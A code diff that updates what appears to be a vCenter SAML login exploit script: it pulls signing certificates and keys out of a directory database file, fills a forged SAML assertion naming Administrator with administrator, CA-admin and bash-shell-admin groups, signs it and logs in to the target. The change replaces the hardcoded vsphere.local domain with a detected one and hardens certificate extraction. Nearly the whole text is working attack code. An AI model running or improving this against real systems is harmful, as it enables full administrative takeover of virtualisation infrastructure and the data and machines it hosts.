@@ -20,22 +20,23 @@ from dateutil.relativedelta import relativedelta
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 idp_cert_flag = b'\x30\x82\x04'
-trusted_cert_flag = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31\x2c\x63\x6e\x3d\x54\x72\x75'
+trusted_cert1_flag = b'\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31\x2c\x63\x6e\x3d\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x69\x66\x69\x63\x61\x74\x65\x43\x68\x61\x69\x6e\x73\x2c' # cn=TrustedCertChain-1,cn=TrustedCertificateChains,
+trusted_cert2_flag = b'\x01\x00\x12\x54\x72\x75\x73\x74\x65\x64\x43\x65\x72\x74\x43\x68\x61\x69\x6e\x2d\x31' # \x01\x00\x12TrustedCertChain-1
 not_it_list = [b'Engineering', b'California', b'object']
 
 SAML_TEMPLATE = \
 r"""<?xml version="1.0" encoding="UTF-8"?>
 <saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol" Destination="https://$VCENTER_IP/ui/saml/websso/sso" ID="_eec012f2ebbc1f420f3dd0961b7f4eea" InResponseTo="$ID" IssueInstant="$ISSUEINSTANT" Version="2.0">
-  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">https://$VCENTER/websso/SAML2/Metadata/vsphere.local</saml2:Issuer>
+  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
   <saml2p:Status>
     <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
     <saml2p:StatusMessage>Request successful</saml2p:StatusMessage>
   </saml2p:Status>
   <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ID="_91c01d7c-5297-4e53-9763-5ef482cb6184" IssueInstant="$ISSUEINSTANT" Version="2.0">
-    <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">https://$VCENTER/websso/SAML2/Metadata/vsphere.local</saml2:Issuer>
+    <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity">https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
     <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Id="placeholder"></ds:Signature>
     <saml2:Subject>
-      <saml2:NameID Format="http://schemas.xmlsoap.org/claims/UPN">Administrator@VSPHERE.LOCAL</saml2:NameID>
+      <saml2:NameID Format="http://schemas.xmlsoap.org/claims/UPN">Administrator@$DOMAIN</saml2:NameID>
       <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
         <saml2:SubjectConfirmationData InResponseTo="$ID" NotOnOrAfter="$NOT_AFTER" Recipient="https://$VCENTER/ui/saml/websso/sso"/>
       </saml2:SubjectConfirmation>
@@ -54,23 +55,23 @@ r"""<?xml version="1.0" encoding="UTF-8"?>
     </saml2:AuthnStatement>
     <saml2:AttributeStatement>
       <saml2:Attribute FriendlyName="Groups" Name="http://rsa.com/schemas/attr-names/2009/01/GroupIdentity" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
-        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\Users</saml2:AttributeValue>
-        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\Administrators</saml2:AttributeValue>
-        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\CAAdmins</saml2:AttributeValue>
-        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\ComponentManager.Administrators</saml2:AttributeValue>
-        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\SystemConfiguration.BashShellAdministrators</saml2:AttributeValue>
-        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\SystemConfiguration.Administrators</saml2:AttributeValue>
-        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\LicenseService.Administrators</saml2:AttributeValue>
-        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local\Everyone</saml2:AttributeValue>
+        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Users</saml2:AttributeValue>
+        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Administrators</saml2:AttributeValue>
+        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\CAAdmins</saml2:AttributeValue>
+        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\ComponentManager.Administrators</saml2:AttributeValue>
+        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.BashShellAdministrators</saml2:AttributeValue>
+        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.Administrators</saml2:AttributeValue>
+        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\LicenseService.Administrators</saml2:AttributeValue>
+        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Everyone</saml2:AttributeValue>
       </saml2:Attribute>
       <saml2:Attribute FriendlyName="userPrincipalName" Name="http://schemas.xmlsoap.org/claims/UPN" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
-        <saml2:AttributeValue xsi:type="xsd:string">Administrator@VSPHERE.LOCAL</saml2:AttributeValue>
+        <saml2:AttributeValue xsi:type="xsd:string">Administrator@$DOMAIN</saml2:AttributeValue>
       </saml2:Attribute>
       <saml2:Attribute FriendlyName="Subject Type" Name="http://vmware.com/schemas/attr-names/2011/07/isSolution" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
         <saml2:AttributeValue xsi:type="xsd:string">false</saml2:AttributeValue>
       </saml2:Attribute>
       <saml2:Attribute FriendlyName="surname" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
-        <saml2:AttributeValue xsi:type="xsd:string">vsphere.local</saml2:AttributeValue>
+        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN</saml2:AttributeValue>
       </saml2:Attribute>
       <saml2:Attribute FriendlyName="givenName" Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
         <saml2:AttributeValue xsi:type="xsd:string">Administrator</saml2:AttributeValue>
@@ -100,12 +101,14 @@ def writekey(bytes, verbose):
     
     return key
 
+
 def check_key_valid(key):
     lines = key.splitlines()
     if lines[1].startswith('MI'):
         return True
     else:
         return False
+
 
 def get_idp_cert(stream, verbose=False):
     tup = stream.findall(idp_cert_flag, bytealigned=True)
@@ -132,32 +135,57 @@ def get_idp_cert(stream, verbose=False):
         sys.exit()
 
 
-def get_trusted_cert(stream, verbose=False):
-    tup = stream.find(trusted_cert_flag)
-    if tup:
-        cn = stream.read('bytes:128')
-        junk = stream.read('bytes:27')
+def get_trusted_cert1(stream, verbose=False):
+    matches = stream.findall(trusted_cert1_flag)
+    for match in matches:
+        stream.read('bytes:50')
         
+        domain_begin = stream.readto('0x636e3d', bytealigned=True)
+        domain_begin_pos = stream.pos
+        
+        domain_end = stream.readto('0x2c')
+        domain_end_pos = stream.pos
+        
+        stream.pos = domain_begin_pos
+        domain_len = int((domain_end_pos - domain_begin_pos - 8) / 8)
+        domain = stream.read(f'bytes:{domain_len}').decode()
+        cn = stream.read(f'bytes:{76 + domain_len}')
+
         # Get TrustedCertificate1 pem 1
         cert1_size_hex = stream.read('bytes:2')
         cert1_size = int(cert1_size_hex.hex(), 16)
         cert1_bytes = stream.read(f'bytes:{cert1_size}')
+        if b'VMware Engineering' not in cert1_bytes:
+            continue
+      
         cert1 = writepem(cert1_bytes, verbose)
+        if not check_key_valid(cert1):
+            continue
+
         print('[*] Successfully extracted trusted certificate 1')        
+        return cert1, domain
+    
+    print(f'[-] Failed to find the trusted certificate 1')
 
-        junk = stream.read('bytes:1')
 
-        # Get TrustedCertificate1 pem2
+def get_trusted_cert2(stream, verbose=False):
+    # Get TrustedCertificate1 pem2
+    matches = stream.findall(trusted_cert2_flag)
+    for match in matches:
+        stream.pos = match - 10240
+        start = stream.readto('0x308204', bytealigned=True)
+        stream.pos = stream.pos - 40 
         cert2_size_hex = stream.read('bytes:2')
         cert2_size = int(cert2_size_hex.hex(), 16)
         cert2_bytes = stream.read(f'bytes:{cert2_size}')
         cert2 = writepem(cert2_bytes, verbose)
-        print('[*] Successfully extracted trusted certificate 2')        
-      
-        return cert1, cert2
-    else:
-        print(f'[-] Failed to find the trusted certificates')
+        if not check_key_valid(cert2):
+            continue
 
+        print('[*] Successfully extracted trusted certificate 2')
+        return cert2
+
+    print(f'[-] Failed to find the trusted cert 2')
 
 def saml_request(vcenter):
     """Get SAML AuthnRequest from vCenter web UI"""
@@ -176,7 +204,7 @@ def saml_request(vcenter):
         raise
 
 
-def fill_template(vcenter_hostname, vcenter_ip, req):
+def fill_template(vcenter_hostname, vcenter_ip, vcenter_domain, req):
     """Fill in the SAML response template"""
     try:
         print('[*] Generating SAML assertion') 
@@ -188,6 +216,7 @@ def fill_template(vcenter_hostname, vcenter_ip, req):
         t = SAML_TEMPLATE
         t = t.replace("$VCENTER_IP", vcenter_ip)
         t = t.replace("$VCENTER", vcenter_hostname)
+        t = t.replace("$DOMAIN", vcenter_domain)
         t = t.replace("$ID", req.get("ID"))
         t = t.replace("$ISSUEINSTANT", req.get("IssueInstant"))
         t = t.replace("$NOT_BEFORE", before)
@@ -263,12 +292,12 @@ if __name__ == '__main__':
     in_stream = open(args.path, 'rb')
     bin_stream = bitstring.ConstBitStream(in_stream)
     idp_cert = get_idp_cert(bin_stream, args.verbose)
-    trusted_cert_1, trusted_cert_2 = get_trusted_cert(bin_stream, args.verbose)
+    trusted_cert_1, domain = get_trusted_cert1(bin_stream, args.verbose)
+    trusted_cert_2 = get_trusted_cert2(bin_stream, args.verbose)
 
     # Generate SAML request
     hostname = get_hostname(args.target)
     req = saml_request(args.target)
-    t = fill_template(hostname, args.target, req)
+    t = fill_template(hostname, args.target, domain, req)
     s = sign_assertion(t, trusted_cert_1, trusted_cert_2, idp_cert)
     c = login(args.target, s)
-
